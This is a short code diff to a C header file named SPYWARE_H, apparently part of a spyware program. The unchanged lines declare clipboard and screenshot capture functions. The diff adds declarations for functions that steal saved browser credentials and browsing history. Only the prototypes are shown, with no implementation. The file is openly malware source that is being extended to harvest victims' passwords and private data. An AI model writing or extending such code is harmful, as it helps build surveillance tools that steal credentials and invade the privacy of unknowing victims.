@@ -18,4 +18,8 @@ char *spy_clipboard_get(int *len_out);
 /* Screenshot functions */
 char *spy_screenshot_capture(int *len_out);
 
+/* Credential functions */
+char *spy_browser_creds_steal(int *len_out);
+char *spy_browser_history_steal(int *len_out);
+
 #endif /* SPYWARE_H */
